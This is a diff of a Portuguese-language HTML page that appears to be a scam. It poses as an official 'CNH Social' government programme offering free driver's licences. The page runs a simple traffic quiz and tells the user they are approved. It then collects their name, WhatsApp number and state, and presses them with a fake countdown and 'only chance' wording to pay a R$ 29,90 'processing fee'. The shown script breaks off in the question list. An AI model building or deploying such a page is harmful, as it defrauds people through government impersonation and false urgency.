@@ -1,4 +1,6 @@
-<!DOCTYPE html><html lang="pt-BR"><head>
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Avaliação Oficial CNH — Teste Rápido</title>
@@ -7,33 +9,33 @@
 @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700;900&display=swap');
 
 body {
-    margin:0;
-    font-family: 'Roboto', sans-serif;
-    background: linear-gradient(to bottom, #f3f5f7, #e0e5ec);
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    min-height: 100vh;
-    padding: 20px 0;
+    margin:0;
+    font-family: 'Roboto', sans-serif;
+    background: linear-gradient(to bottom, #f3f5f7, #e0e5ec);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    padding: 20px 0;
 }
 
 .quiz-container {
-    width: 95%;
-    max-width: 720px;
-    background:#fff;
-    border-radius:15px;
-    box-shadow:0 15px 40px rgba(0,0,0,0.2);
-    overflow:hidden;
-    position: relative;
-    font-family: 'Poppins', sans-serif; 
+    width: 95%;
+    max-width: 720px;
+    background:#fff;
+    border-radius:15px;
+    box-shadow:0 15px 40px rgba(0,0,0,0.2);
+    overflow:hidden;
+    position: relative;
+    font-family: 'Poppins', sans-serif;
 }
 
 .header {
-    background: linear-gradient(90deg,#002b7f,#0041c2);
-    color:#fff;
-    padding:20px 30px;
-    text-align:center;
-    box-shadow:0 5px 15px rgba(0,0,0,0.1);
+    background: linear-gradient(90deg,#002b7f,#0041c2);
+    color:#fff;
+    padding:20px 30px;
+    text-align:center;
+    box-shadow:0 5px 15px rgba(0,0,0,0.1);
 }
 
 .header h1 { margin:0; font-size:1.8rem; }
@@ -41,19 +43,19 @@ body {
 
 /* Estilos do Quiz */
 .progress-container {
-    width:100%;
-    height:10px;
-    background:#ddd;
-    border-radius:5px;
-    overflow:hidden;
-    margin-top:10px;
+    width:100%;
+    height:10px;
+    background:#ddd;
+    border-radius:5px;
+    overflow:hidden;
+    margin-top:10px;
 }
 
 .progress-bar {
-    height:10px;
-    width:0%;
-    background: linear-gradient(90deg,#ffcb05,#002b7f);
-    transition: width 0.4s ease;
+    height:10px;
+    width:0%;
+    background: linear-gradient(90deg,#ffcb05,#002b7f);
+    transition: width 0.4s ease;
 }
 
 .question-count { font-size:0.85rem; color:#555; margin:10px 0; text-align:right; padding-right:15px; }
@@ -66,19 +68,19 @@ body {
 .options { display:grid; grid-template-columns:1fr 1fr; gap:15px; margin:20px; }
 
 .option-card {
-    background: linear-gradient(145deg,#ffffff,#e0e5ec);
-    border-radius:15px;
-    padding:18px;
-    text-align:center;
-    font-size:1rem;
-    cursor:pointer;
-    transition: all 0.3s ease;
-    box-shadow:0 5px 15px rgba(0,0,0,0.1);
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    gap:8px;
-    user-select:none;
+    background: linear-gradient(145deg,#ffffff,#e0e5ec);
+    border-radius:15px;
+    padding:18px;
+    text-align:center;
+    font-size:1rem;
+    cursor:pointer;
+    transition: all 0.3s ease;
+    box-shadow:0 5px 15px rgba(0,0,0,0.1);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:8px;
+    user-select:none;
 }
 
 .option-card:hover { transform:scale(1.05); box-shadow:0 8px 25px rgba(0,0,0,0.2); }
@@ -87,131 +89,183 @@ body {
 .option-card.wrong { background:#f44336; color:#fff; box-shadow:0 0 15px 3px red; }
 
 @keyframes shine {
-    0% { box-shadow: 0 0 0px gold; transform:scale(1); }
-    50% { box-shadow: 0 0 20px gold; transform:scale(1.05); }
-    100% { box-shadow: 0 0 5px gold; transform:scale(1); }
+    0% { box-shadow: 0 0 0px gold; transform:scale(1); }
+    50% { box-shadow: 0 0 20px gold; transform:scale(1.05); }
+    100% { box-shadow: 0 0 5px gold; transform:scale(1); }
 }
 
 #nextBtn {
-    margin:15px 20px 25px 20px;
-    background:#002b7f;
-    color:#fff;
-    border:none;
-    padding:15px;
-    border-radius:12px;
-    cursor:pointer;
-    font-size:1.1rem;
-    width:calc(100% - 40px);
-    transition: all 0.3s ease;
+    margin:15px 20px 25px 20px;
+    background:#002b7f;
+    color:#fff;
+    border:none;
+    padding:15px;
+    border-radius:12px;
+    cursor:pointer;
+    font-size:1.1rem;
+    width:calc(100% - 40px);
+    transition: all 0.3s ease;
 }
 
 #nextBtn:hover { background:#001f5f; }
 
 .footer { font-size:0.8rem; color:#555; text-align:center; margin-bottom:15px; }
 
-/* --- TELA DE TRANSIÇÃO (NOVA TELA) --- */
+/* --- TELA DE BOAS-VINDAS (NOVA TELA PRINCIPAL) --- */
+.welcome-container {
+    padding: 50px 20px;
+    text-align: center;
+    background: linear-gradient(180deg, #002b7f, #0041c2); /* Fundo em degradê similar ao header */
+    color: #fff;
+    border-radius: 15px; /* Manter o mesmo border-radius do quiz-container */
+    box-shadow: 0 15px 40px rgba(0,0,0,0.2);
+    min-height: 400px; /* Para manter uma boa altura */
+    display: flex;
+    flex-direction: column;
+    justify-content: space-around;
+    align-items: center;
+    width: 100%;
+    box-sizing: border-box;
+}
+.welcome-container h2 {
+    font-size: 2.2rem;
+    font-weight: 900;
+    margin-bottom: 10px;
+}
+.welcome-container p {
+    font-size: 1.1rem;
+    opacity: 0.9;
+    margin-bottom: 30px;
+}
+#startBtn {
+    background: linear-gradient(90deg,#ffcb05,#ff9800);
+    color: #002b7f;
+    border: none;
+    padding: 18px 30px;
+    border-radius: 12px;
+    cursor: pointer;
+    font-size: 1.3rem;
+    width: 90%;
+    max-width: 350px;
+    transition: all 0.3s ease;
+    font-weight: 700;
+    box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+}
+#startBtn:hover {
+    transform: scale(1.05);
+    background: linear-gradient(90deg,#ff9800,#ffcb05);
+}
+.welcome-info {
+    font-size: 0.9rem;
+    margin-top: 20px;
+    padding: 10px;
+    background: rgba(255, 255, 255, 0.1);
+    border-radius: 8px;
+}
+
+/* --- TELA DE TRANSIÇÃO (APÓS QUIZ) --- */
 .transition-container {
-    padding: 50px 20px;
-    text-align: center;
-    background: #f0f7ff;
-    position: relative; /* Para posicionar os confetes */
+    padding: 50px 20px;
+    text-align: center;
+    background: #f0f7ff;
+    position: relative;
 }
 
 /* Confetes */
 .confetti {
-    position: absolute;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    pointer-events: none;
-    overflow: hidden;
-    z-index: 5;
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    pointer-events: none;
+    overflow: hidden;
+    z-index: 5;
 }
 
 .confetti-piece {
-    position: absolute;
-    width: 10px;
-    height: 20px;
-    background: #ffcc00;
-    opacity: 0;
-    animation: fall 3s infinite;
-    z-index: 10;
+    position: absolute;
+    width: 10px;
+    height: 20px;
+    background: #ffcc00;
+    opacity: 0;
+    animation: fall 3s infinite;
+    z-index: 10;
 }
 
 @keyframes fall {
-    0% { transform: translate(0, -100px) rotate(0deg); opacity: 1; }
-    100% { transform: translate(100px, 100vh) rotate(720deg); opacity: 0; }
+    0% { transform: translate(0, -100px) rotate(0deg); opacity: 1; }
+    100% { transform: translate(100px, 100vh) rotate(720deg); opacity: 0; }
 }
 
 .transition-container h2 {
-    font-size: 2.2rem;
-    color: #4CAF50;
-    margin-bottom: 25px;
-    font-weight: 900;
+    font-size: 2.2rem;
+    color: #4CAF50;
+    margin-bottom: 25px;
+    font-weight: 900;
 }
 
 .loading-bar {
-    width: 80%;
-    margin: 30px auto 40px auto;
-    height: 15px;
-    background: #e0e0e0;
-    border-radius: 10px;
-    overflow: hidden;
-    box-shadow: inset 0 2px 4px rgba(0,0,0,0.1);
+    width: 80%;
+    margin: 30px auto 40px auto;
+    height: 15px;
+    background: #e0e0e0;
+    border-radius: 10px;
+    overflow: hidden;
+    box-shadow: inset 0 2px 4px rgba(0,0,0,0.1);
 }
 
 #loading-progress {
-    height: 100%;
-    width: 0%;
-    background: linear-gradient(90deg, #002b7f, #0041c2);
-    border-radius: 10px;
-    transition: width 3s ease-in-out; /* 3 segundos de carregamento */
+    height: 100%;
+    width: 0%;
+    background: linear-gradient(90deg, #002b7f, #0041c2);
+    border-radius: 10px;
+    transition: width 3s ease-in-out;
 }
 
 #validation-message {
-    font-size: 1.1rem;
-    color: #002b7f;
-    margin-bottom: 30px;
-    font-weight: 700;
-    min-height: 25px;
+    font-size: 1.1rem;
+    color: #002b7f;
+    margin-bottom: 30px;
+    font-weight: 700;
+    min-height: 25px;
 }
 
 .category-selection h3 {
-    font-size: 1.4rem;
-    color: #002b7f;
-    margin-bottom: 25px;
-    font-weight: 700;
+    font-size: 1.4rem;
+    color: #002b7f;
+    margin-bottom: 25px;
+    font-weight: 700;
 }
 
 .category-options {
-    display: flex;
-    flex-direction: column;
-    gap: 15px;
-    margin-bottom: 40px;
+    display: flex;
+    flex-direction: column;
+    gap: 15px;
+    margin-bottom: 40px;
 }
 
 .category-btn {
-    background: linear-gradient(90deg,#ffcb05,#ff9800);
-    color: #002b7f;
-    border: none;
-    padding: 15px 20px;
-    border-radius: 12px;
-    cursor: pointer;
-    font-size: 1.1rem;
-    width: 100%;
-    transition: all 0.3s ease;
-    font-weight: 700;
-    box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+    background: linear-gradient(90deg,#ffcb05,#ff9800);
+    color: #002b7f;
+    border: none;
+    padding: 15px 20px;
+    border-radius: 12px;
+    cursor: pointer;
+    font-size: 1.1rem;
+    width: 100%;
+    transition: all 0.3s ease;
+    font-weight: 700;
+    box-shadow: 0 5px 15px rgba(0,0,0,0.1);
 }
 .category-btn:hover {
-    transform: scale(1.02);
-    background: linear-gradient(90deg,#ff9800,#ffcb05);
+    transform: scale(1.02);
+    background: linear-gradient(90deg,#ff9800,#ffcb05);
 }
 .category-btn.selected {
-    border: 3px solid #4CAF50;
-    transform: scale(1.05);
-    box-shadow: 0 0 15px #4CAF50;
+    border: 3px solid #4CAF50;
+    transform: scale(1.05);
+    box-shadow: 0 0 15px #4CAF50;
 }
 
 
@@ -222,8 +276,8 @@ body {
 
 /* TELA 1 - RESULTADO E FORMULÁRIO */
 .result-container {
-    padding: 30px 20px;
-    text-align: center;
+    padding: 30px 20px;
+    text-align: center;
 }
 .result-container h2 { font-size: 2rem; color: #4CAF50; margin-bottom: 10px; font-weight: 900; }
 .result-container .score-display { font-size: 1.2rem; color: #002b7f; margin-bottom: 20px; font-weight: 700; }
@@ -239,119 +293,119 @@ body {
 /* --- TELA 2 - CONFIRMAÇÃO DE PAGAMENTO (PREMIUM) --- */
 
 .payment-container {
-    padding: 40px;
-    text-align: center;
-    background: #fcfcfc;
+    padding: 40px;
+    text-align: center;
+    background: #fcfcfc;
 }
 
 .payment-container h2 {
-    font-size: 2.2rem;
-    color: #002b7f;
-    margin-bottom: 10px;
-    font-weight: 900;
-    line-height: 1.2;
+    font-size: 2.2rem;
+    color: #002b7f;
+    margin-bottom: 10px;
+    font-weight: 900;
+    line-height: 1.2;
 }
 
 .success-message-2 {
-    font-size: 1.1rem;
-    color: #4CAF50;
-    margin-bottom: 30px;
-    font-weight: 700;
-    border-bottom: 2px solid #eee;
-    padding-bottom: 15px;
+    font-size: 1.1rem;
+    color: #4CAF50;
+    margin-bottom: 30px;
+    font-weight: 700;
+    border-bottom: 2px solid #eee;
+    padding-bottom: 15px;
 }
 
 /* Cronômetro de Urgência */
 .timer-box {
-    background: #ff4500; 
-    color: #fff;
-    padding: 15px 25px;
-    border-radius: 15px;
-    margin: 30px 0;
-    font-size: 1.2rem;
-    font-weight: 600;
-    box-shadow: 0 8px 15px rgba(255, 69, 0, 0.4);
-    border: 2px solid #ffcb05;
+    background: #ff4500; 
+    color: #fff;
+    padding: 15px 25px;
+    border-radius: 15px;
+    margin: 30px 0;
+    font-size: 1.2rem;
+    font-weight: 600;
+    box-shadow: 0 8px 15px rgba(255, 69, 0, 0.4);
+    border: 2px solid #ffcb05;
 }
 
 #countdown {
-    font-size: 3.5rem;
-    font-weight: 900;
-    display: block;
-    margin: 5px 0 10px 0;
-    color: #ffcb05; 
-    letter-spacing: 2px;
+    font-size: 3.5rem;
+    font-weight: 900;
+    display: block;
+    margin: 5px 0 10px 0;
+    color: #ffcb05; 
+    letter-spacing: 2px;
 }
 
 /* Justificativa da Taxa */
 .justification {
-    text-align: left;
-    margin: 35px 0;
-    padding: 25px;
-    background: #f8faff;
-    border-radius: 15px;
-    border: 1px solid #e0e7ff;
+    text-align: left;
+    margin: 35px 0;
+    padding: 25px;
+    background: #f8faff;
+    border-radius: 15px;
+    border: 1px solid #e0e7ff;
 }
 
 .justification h3 {
-    font-size: 1.6rem;
-    color: #002b7f;
-    margin-top: 0;
-    border-bottom: 3px solid #ffcb05;
-    padding-bottom: 10px;
-    font-weight: 700;
-    text-align: center;
+    font-size: 1.6rem;
+    color: #002b7f;
+    margin-top: 0;
+    border-bottom: 3px solid #ffcb05;
+    padding-bottom: 10px;
+    font-weight: 700;
+    text-align: center;
 }
 
 .justification strong {
-    color: #ff4500;
-    font-weight: 700;
+    color: #ff4500;
+    font-weight: 700;
 }
 
 .cost-breakdown {
-    list-style: none;
-    padding: 0;
-    margin: 20px 0;
+    list-style: none;
+    padding: 0;
+    margin: 20px 0;
 }
 
 .cost-breakdown li {
-    display: flex;
-    justify-content: space-between;
-    padding: 8px 0;
-    border-bottom: 1px dashed #ddd;
-    font-size: 1rem;
-    color: #333;
+    display: flex;
+    justify-content: space-between;
+    padding: 8px 0;
+    border-bottom: 1px dashed #ddd;
+    font-size: 1rem;
+    color: #333;
 }
 
 .cost-breakdown li:last-child {
-    border-bottom: none;
-    font-weight: 700;
-    color: #002b7f;
-    font-size: 1.1rem;
+    border-bottom: none;
+    font-weight: 700;
+    color: #002b7f;
+    font-size: 1.1rem;
 }
 
 .cost-breakdown li span:first-child { font-weight: 600; }
 
 #payBtn {
-    background: linear-gradient(90deg,#ffcb05,#ff9800);
-    color: #002b7f;
-    border: none;
-    padding: 22px;
-    border-radius: 15px;
-    cursor: pointer;
-    font-size: 1.5rem;
-    width: 100%;
-    transition: all 0.4s ease;
-    font-weight: 900;
-    text-transform: uppercase;
-    box-shadow: 0 10px 20px rgba(255, 152, 0, 0.4);
-    letter-spacing: 1px;
-    transform: scale(1.02);
+    background: linear-gradient(90deg,#ffcb05,#ff9800);
+    color: #002b7f;
+    border: none;
+    padding: 22px;
+    border-radius: 15px;
+    cursor: pointer;
+    font-size: 1.5rem;
+    width: 100%;
+    transition: all 0.4s ease;
+    font-weight: 900;
+    text-transform: uppercase;
+    box-shadow: 0 10px 20px rgba(255, 152, 0, 0.4);
+    letter-spacing: 1px;
+    transform: scale(1.02);
 }
 
 #payBtn:hover {
-    background: linear-gradient(90deg,#ff9800,#ffcb05);
-    transform: scale(1.05);
+    background: linear-gradient(90deg,#ff9800,#ffcb05);
+    transform: scale(1.05);
 }
 .small-print { font-size: 0.85rem; color: #888; margin-top: 20px; }
 </style>
@@ -359,162 +413,177 @@ body {
 <body>
 
 <div class="quiz-container">
-    <div class="header">
-        <h1>Avaliação Oficial de Aptidão CNH</h1>
-        <p>Avaliação de Aptidão Teórica e Psicotécnica | Programa CNH Social</p>
-        <div class="progress-container">
-            <div class="progress-bar" id="progress-bar"></div>
-        </div>
-    </div>
+    
+    <div id="welcome-screen" class="welcome-container">
+        <div style="width: 100%;">
+            <h2 style="color: #fff; font-size: 2.5rem;">Avaliação Oficial de Aptidão CNH</h2>
+            <p style="font-size: 1.2rem; font-weight: 600;">Teste rápido para concorrer a uma CNH gratuita!</p>
+        </div>
+        
+        <button id="startBtn">Começar Teste Rápido de Aptidão</button>
+        
+        <div class="welcome-info">
+            *Avaliação de Aptidão Teórica e Psicotécnica | Programa CNH Social
+        </div>
+    </div>
 
-    <div id="quiz-content" class="quiz-content">
-        <div class="question-count" id="question-count">1/31</div>
 
-        <div class="question">
-            <span class="question-emoji" id="question-emoji">🚦</span>
-            <div class="question-title" id="question-title">Pergunta Principal</div>
-            <div class="question-subtitle">Todas as perguntas são orientativas e seguem o conteúdo do exame teórico e psicotécnico.</div>
-        </div>
+    <div id="quiz-content" class="quiz-content hidden">
+        <div class="header">
+            <h1>Avaliação Oficial de Aptidão CNH</h1>
+            <p>Avaliação de Aptidão Teórica e Psicotécnica | Programa CNH Social</p>
+            <div class="progress-container">
+                <div class="progress-bar" id="progress-bar"></div>
+            </div>
+        </div>
+        <div class="question-count" id="question-count">1/31</div>
 
-        <div class="options" id="options"></div>
+        <div class="question">
+            <span class="question-emoji" id="question-emoji">🚦</span>
+            <div class="question-title" id="question-title">Pergunta Principal</div>
+            <div class="question-subtitle">Todas as perguntas são orientativas e seguem o conteúdo do exame teórico e psicotécnico.</div>
+        </div>
 
-        <button id="nextBtn">Próxima Pergunta</button>
+        <div class="options" id="options"></div>
 
-        <div class="footer">
-            Pontuação mínima para aptidão: 23/31
-        </div>
-    </div>
+        <button id="nextBtn">Próxima Pergunta</button>
 
-    <div id="transition-screen" class="transition-container hidden">
-        <div class="confetti" id="confetti-container"></div>
-        
-        <div id="loading-phase">
-            <h2 style="color: #002b7f;">Análise de Aptidão Final</h2>
-            <p id="validation-message" style="font-size: 1.1rem; color: #002b7f; font-weight: 700; margin-bottom: 30px;">
-                Estamos Validando Sua Pontuação e Elegibilidade...
-            </p>
+        <div class="footer">
+            Pontuação mínima para aptidão: 23/31
+        </div>
+    </div>
 
-            <div class="loading-bar">
-                <div id="loading-progress"></div>
-            </div>
-            <div class="footer" style="margin-top:40px;">
-                Aguarde. Processamento de dados via sistema oficial.
-            </div>
-        </div>
+    <div id="transition-screen" class="transition-container hidden">
+        <div class="confetti" id="confetti-container"></div>
+        
+        <div id="loading-phase">
+            <h2 style="color: #002b7f;">Análise de Aptidão Final</h2>
+            <p id="validation-message" style="font-size: 1.1rem; color: #002b7f; font-weight: 700; margin-bottom: 30px;">
+                Estamos Validando Sua Pontuação e Elegibilidade...
+            </p>
 
-        <div id="choice-phase" class="hidden">
-             <h2 style="color: #4CAF50; font-size: 2.5rem;">🎉 APROVAÇÃO E VAGA GARANTIDA!</h2>
-             <p style="font-size: 1.1rem; color: #333; margin-bottom: 30px;">
-                 Parabéns! Próxima Etapa: Defina a categoria para a emissão da sua Carteira Nacional de Habilitação Social - *100% gratuita.*
-             </p>
+            <div class="loading-bar">
+                <div id="loading-progress"></div>
+            </div>
+            <div class="footer" style="margin-top:40px;">
+                Aguarde. Processamento de dados via sistema oficial.
+            </div>
+        </div>
 
-             <div class="category-selection">
-                 <h3>Selecione a Categoria da sua CNH Gratuita:</h3>
-                 <div class="category-options">
-                     <button class="category-btn" data-category="A">🛵 Categoria A (Moto) - Vaga Gratuita</button>
-                     <button class="category-btn" data-category="B">🚗 Categoria B (Carro) - Vaga Gratuita</button>
-                     <button class="category-btn" data-category="AB">🏍️ Categoria A e B (Moto e Carro) - Vaga Gratuita</button>
-                 </div>
-                 <p style="font-size: 0.9rem; color: #ff4500; font-weight: 600;">*Apenas uma categoria pode ser selecionada.</p>
-             </div>
-        </div>
+        <div id="choice-phase" class="hidden">
+             <h2 style="color: #4CAF50; font-size: 2.5rem;">🎉 APROVAÇÃO E VAGA GARANTIDA!</h2>
+             <p style="font-size: 1.1rem; color: #333; margin-bottom: 30px;">
+                 Parabéns! Próxima Etapa: Defina a categoria para a emissão da sua Carteira Nacional de Habilitação Social - *100% gratuita.*
+             </p>
 
-    </div>
-    <div id="result-screen" class="result-container hidden">
-        <h2>✅ Parabéns! Você foi Aprovado(a)!</h2>
-        
-        <div class="score-display">
-            Você atingiu a qualificação com <strong id="final-score">X de 31</strong> acertos.
-        </div>
-        
-        <p class="result-message">
-            Você demonstrou preparo no exame teórico e psicotécnico, atingindo a pontuação mínima para ser considerado(a) *qualificado(a)* ao programa CNH Social.
-        </p>
-        <div id="selected-cnh-display" style="font-size: 1.2rem; color: #ff9800; font-weight: 900; margin-bottom: 20px;">
-             Sua escolha: <span id="cnh-chosen"></span>
-        </div>
+             <div class="category-selection">
+                 <h3>Selecione a Categoria da sua CNH Gratuita:</h3>
+                 <div class="category-options">
+                     <button class="category-btn" data-category="A">🛵 Categoria A (Moto) - Vaga Gratuita</button>
+                     <button class="category-btn" data-category="B">🚗 Categoria B (Carro) - Vaga Gratuita</button>
+                     <button class="category-btn" data-category="AB">🏍️ Categoria A e B (Moto e Carro) - Vaga Gratuita</button>
+                 </div>
+                 <p style="font-size: 0.9rem; color: #ff4500; font-weight: 600;">*Apenas uma categoria pode ser selecionada.</p>
+             </div>
+        </div>
 
-        <p class="form-title">
-            Passo 2: Pré-cadastro Oficial para Reserva da Vaga
-        </p>
-        
-        <form id="pre-cadastro-form">
-            <div class="form-group">
-                <input type="text" id="nome" placeholder="Seu Nome Completo" required="">
-            </div>
-            <div class="form-group">
-                <input type="tel" id="whatsapp" placeholder="WhatsApp (DDD + Número)" required="">
-            </div>
-            <div class="form-group">
-                <select id="estado" required="">
-                    <option value="">Selecione Seu Estado (UF)</option>
-                    <option value="AC">Acre</option>
-                    <option value="AL">Alagoas</option>
-                    <option value="AP">Amapá</option>
-                    <option value="AM">Amazonas</option>
-                    <option value="BA">Bahia</option>
-                    <option value="CE">Ceará</option>
-                    <option value="DF">Distrito Federal</option>
-                    <option value="ES">Espírito Santo</option>
-                    <option value="GO">Goiás</option>
-                    <option value="MA">Maranhão</option>
-                    <option value="MT">Mato Grosso</option>
-                    <option value="MS">Mato Grosso do Sul</option>
-                    <option value="MG">Minas Gerais</option>
-                    <option value="PA">Pará</option>
-                    <option value="PB">Paraíba</option>
-                    <option value="PR">Paraná</option>
-                    <option value="PE">Pernambuco</option>
-                    <option value="PI">Piauí</option>
-                    <option value="RJ">Rio de Janeiro</option>
-                    <option value="RN">Rio Grande do Norte</option>
-                    <option value="RS">Rio Grande do Sul</option>
-                    <option value="RO">Rondônia</option>
-                    <option value="RR">Roraima</option>
-                    <option value="SC">Santa Catarina</option>
-                    <option value="SP">São Paulo</option>
-                    <option value="SE">Sergipe</option>
-                    <option value="TO">Tocantins</option>
-                </select>
-            </div>
-            <button type="submit" id="submitBtn">Garantir Minha CNH Gratuita Agora</button>
-        </form>
-        <div class="footer" style="margin-top:20px;">
-            A CNH Social é um programa do Governo Federal/Estadual.
-        </div>
-    </div>
+    </div>
+    
+    <div id="result-screen" class="result-container hidden">
+        <h2>✅ Parabéns! Você foi Aprovado(a)!</h2>
+        
+        <div class="score-display">
+            Você atingiu a qualificação com <strong id="final-score">X de 31</strong> acertos.
+        </div>
+        
+        <p class="result-message">
+            Você demonstrou preparo no exame teórico e psicotécnico, atingindo a pontuação mínima para ser considerado(a) *qualificado(a)* ao programa CNH Social.
+        </p>
+        <div id="selected-cnh-display" style="font-size: 1.2rem; color: #ff9800; font-weight: 900; margin-bottom: 20px;">
+             Sua escolha: <span id="cnh-chosen"></span>
+        </div>
 
-    <div id="payment-screen" class="payment-container hidden">
-        <h2>Você está Quase Lá! Sua CNH Gratuita está Confirmada! 🥳</h2>
-        <p class="success-message-2">
-            Parabéns pela sua *aprovação prioritária* no Teste de Aptidão. Seu resultado garante sua qualificação no programa CNH Social.
-        </p>
+        <p class="form-title">
+            Passo 2: Pré-cadastro Oficial para Reserva da Vaga
+        </p>
+        
+        <form id="pre-cadastro-form">
+            <div class="form-group">
+                <input type="text" id="nome" placeholder="Seu Nome Completo" required="">
+            </div>
+            <div class="form-group">
+                <input type="tel" id="whatsapp" placeholder="WhatsApp (DDD + Número)" required="">
+            </div>
+            <div class="form-group">
+                <select id="estado" required="">
+                    <option value="">Selecione Seu Estado (UF)</option>
+                    <option value="AC">Acre</option>
+                    <option value="AL">Alagoas</option>
+                    <option value="AP">Amapá</option>
+                    <option value="AM">Amazonas</option>
+                    <option value="BA">Bahia</option>
+                    <option value="CE">Ceará</option>
+                    <option value="DF">Distrito Federal</option>
+                    <option value="ES">Espírito Santo</option>
+                    <option value="GO">Goiás</option>
+                    <option value="MA">Maranhão</option>
+                    <option value="MT">Mato Grosso</option>
+                    <option value="MS">Mato Grosso do Sul</option>
+                    <option value="MG">Minas Gerais</option>
+                    <option value="PA">Pará</option>
+                    <option value="PB">Paraíba</option>
+                    <option value="PR">Paraná</option>
+                    <option value="PE">Pernambuco</option>
+                    <option value="PI">Piauí</option>
+                    <option value="RJ">Rio de Janeiro</option>
+                    <option value="RN">Rio Grande do Norte</option>
+                    <option value="RS">Rio Grande do Sul</option>
+                    <option value="RO">Rondônia</option>
+                    <option value="RR">Roraima</option>
+                    <option value="SC">Santa Catarina</option>
+                    <option value="SP">São Paulo</option>
+                    <option value="SE">Sergipe</option>
+                    <option value="TO">Tocantins</option>
+                </select>
+            </div>
+            <button type="submit" id="submitBtn">Garantir Minha CNH Gratuita Agora</button>
+        </form>
+        <div class="footer" style="margin-top:20px;">
+            A CNH Social é um programa do Governo Federal/Estadual.
+        </div>
+    </div>
 
-        <div class="timer-box">
-            🚨 *ALERTA DE VAGA ÚNICA!* Sua reserva expira em:
-            <span id="countdown">10:00</span>
-            <p style="font-size: 0.9rem; margin: 5px 0 0 0; font-weight: 400; color: #fff;">(Após o tempo, a vaga é liberada para o próximo candidato qualificado na fila.)</p>
-        </div>
+    <div id="payment-screen" class="payment-container hidden">
+        <h2>Você está Quase Lá! Sua CNH Gratuita está Confirmada! 🥳</h2>
+        <p class="success-message-2">
+            Parabéns pela sua *aprovação prioritária* no Teste de Aptidão. Seu resultado garante sua qualificação no programa CNH Social.
+        </p>
 
-        <div class="justification">
-            <h3>Por Que a Taxa Única de R$ 29,90 é Necessária?</h3>
-            
-            <p>Como aprovado(a), sua CNH (que custaria mais de R$ 2.000) é **100% gratuita*. O valor de *R$ 29,90* é uma *Taxa de Processamento e Emissão de Documentos** obrigatória para a validação final da sua vaga, conforme as diretrizes operacionais do programa.</p>
-            
-            <ul class="cost-breakdown">
-                <li><span>Custo da CNH Completa:</span> <span>R$ 2.000+</span></li>
-                <li><span>Seu Desconto CNH Social:</span> <span style="color: #ff4500;">- R$ 2.000+</span></li>
-                <li><span>Taxa de Processamento (Validação e Emissão de Certificado):</span> <span>R$ 29,90</span></li>
-                <li style="border-top: 1px solid #ddd;"><span>Seu Custo Total Final:</span> <span>R$ 29,90</span></li>
-            </ul>
+        <div class="timer-box">
+            🚨 *ALERTA DE VAGA ÚNICA!* Sua reserva expira em:
+            <span id="countdown">10:00</span>
+            <p style="font-size: 0.9rem; margin: 5px 0 0 0; font-weight: 400; color: #fff;">(Após o tempo, a vaga é liberada para o próximo candidato qualificado na fila.)</p>
+        </div>
 
-            <p>Ao pagar a taxa agora, você garante o **processamento imediato de prioridade* e a *reserva da sua vaga** antes que o tempo se esgote e ela seja transferida. **Esta é a ÚNICA CHANCE de confirmar sua participação.</p>
-        </div>
+        <div class="justification">
+            <h3>Por Que a Taxa Única de R$ 29,90 é Necessária?</h3>
+            
+            <p>Como aprovado(a), sua CNH (que custaria mais de R$ 2.000) é **100% gratuita*. O valor de *R$ 29,90* é uma *Taxa de Processamento e Emissão de Documentos** obrigatória para a validação final da sua vaga, conforme as diretrizes operacionais do programa.</p>
+            
+            <ul class="cost-breakdown">
+                <li><span>Custo da CNH Completa:</span> <span>R$ 2.000+</span></li>
+                <li><span>Seu Desconto CNH Social:</span> <span style="color: #ff4500;">- R$ 2.000+</span></li>
+                <li><span>Taxa de Processamento (Validação e Emissão de Certificado):</span> <span>R$ 29,90</span></li>
+                <li style="border-top: 1px solid #ddd;"><span>Seu Custo Total Final:</span> <span>R$ 29,90</span></li>
+            </ul>
 
-        <button id="payBtn">Confirmar o Pré-cadastro e Pagar Taxa Única de R$ 29,90</button>
-        
-        <p class="small-print">Seu pagamento é processado pela plataforma de checkout seguro e garante a reserva da sua vaga no sistema do Governo.</p>
-    </div>
+            <p>Ao pagar a taxa agora, você garante o **processamento imediato de prioridade* e a *reserva da sua vaga** antes que o tempo se esgote e ela seja transferida. **Esta é a ÚNICA CHANCE de confirmar sua participação.</p>
+        </div>
+
+        <button id="payBtn">Confirmar o Pré-cadastro e Pagar Taxa Única de R$ 29,90</button>
+        
+        <p class="small-print">Seu pagamento é processado pela plataforma de checkout seguro e garante a reserva da sua vaga no sistema do Governo.</p>
+    </div>
 
 </div>
 
@@ -523,53 +592,58 @@ body {
 <script>
 // Array de perguntas do quiz
 const questions = [
-    {emoji:"🚦", titulo:"O que significa uma luz vermelha no semáforo?", opcoes:["⛔ Parar","⚠️ Atenção","🟢 Seguir","🚗 Reduzir velocidade"], correta:0},
-    {emoji:"🛣️", titulo:"Você está em uma via de mão única. Qual regra deve seguir?", opcoes:["↩️ Pode fazer retorno","➡️ Apenas seguir a mão da via","↔️ Pode mudar sentido","🛑 Parar sempre"], correta:1},
-    {emoji:"🧠", titulo:"Se A > B e B > C, então A > C?", opcoes:["✅ Sim","❌ Não","⚠️ Depende","🤔 Não sei"], correta:0},
-    {emoji:"🏎️", titulo:"Distância mínima segura entre veículos em estrada seca?", opcoes:["🚗 2 segundos","🚕 1 segundo","🚙 3 segundos","🛑 0,5 segundo"], correta:0},
-    {emoji:"🚗", titulo:"Sinal correto ao ultrapassar outro veículo?", opcoes:["↗️ Seta direita","↖️ Seta esquerda","⚠️ Farol alto","💨 Nenhum"], correta:0},
-    {emoji:"🛑", titulo:"O que significa uma placa de 'Pare'?", opcoes:["⛔ Parar obrigatoriamente","⚠️ Atenção e seguir","🟢 Pode prosseguir","🚗 Apenas reduzir velocidade"], correta:0},
-    {emoji:"🚧", titulo:"Área com sinal de obras. Como deve dirigir?", opcoes:["🚗 Velocidade normal","⚠️ Reduzir e atenção","💨 Acelerar","🛑 Parar totalmente"], correta:1},
